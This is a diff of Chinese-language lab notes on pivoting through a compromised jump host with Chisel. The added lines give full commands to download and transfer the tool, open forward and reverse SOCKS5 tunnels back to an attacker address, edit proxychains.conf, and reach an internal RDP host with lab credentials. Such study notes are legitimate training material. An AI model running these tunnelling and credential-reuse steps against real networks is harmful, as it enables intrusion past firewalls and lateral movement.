@@ -266,27 +266,35 @@ TCP/UDP 的隧道 (tunneling) 工具
 使用 HTTP 传输经由 SSH 加密的数据
 在受 firewall 限制的环境中
 攻击机和目标属于不同的网段
-攻击机可到 172.16.5.0/23 网络（内部网络）的 Web 服务器
+攻击机可到 172.16.5.0/23 网络（内部网络）的 Web 跳板机
 在跳板启动 Chisel 服务器，监听一个端口，访问目标
-
-
-
-
-
-
-Chisel:
-    scp
-    chmod +x chisel
-
-    ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
-    mattchow@htb[/htb]$ ./chisel client -v 10.129.202.64:1234 socks
-    proxychains xfreerdp /v:DCIP /u:victor /p:pass@123
-
-    mattchow@htb[/htb]$ sudo ./chisel server --reverse -v -p 1234 --socks5
-    ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks
-    proxychains xfreerdp /v:DCIP /u:victor /p:pass@123
-
+如果收到错误消息，尝试不同版本
     https://github.com/jpillora/chisel
+    https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=1469s      缩小文件大小
+git clone https://github.com/jpillora/chisel.git       下载
+cd chisel && go build                                  编译
+或
+wget -q https://github.com/jpillora/chisel/releases/download/v1.7.6/chisel_1.7.6_linux_amd64.gz && gunzip chisel_1.7.6_linux_amd64.gz      下载
+scp chisel ubuntu@10.129.202.64:~/                     传输
+ubuntu@WEB01$ chmod +x chisel
+ubuntu@WEB01$ ./chisel server -v -p 1234 --socks5      在跳板启动服务端
+./chisel client -v 10.129.202.64:1234 socks            连接到跳板
+sudo sed -i '/^socks5 127.0.0.1 1080$/d; $a socks5 127.0.0.1 1080' /etc/proxychains.conf      删除重复，添加新行
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123                                     连接到目标
+或反向
+sudo ./chisel server --reverse -v -p 1234 --socks5             在攻击机启动服务端
+ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks      在跳板启动客户端
+编辑和确认 proxychains.conf
+sudo sed -i '/^socks5 127.0.0.1 1080$/d; $a socks5 127.0.0.1 1080' /etc/proxychains.conf      删除重复，添加新行
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123                                     连接到目标
+
+
+
+
+
+
+
+
 
 
 ICMP:
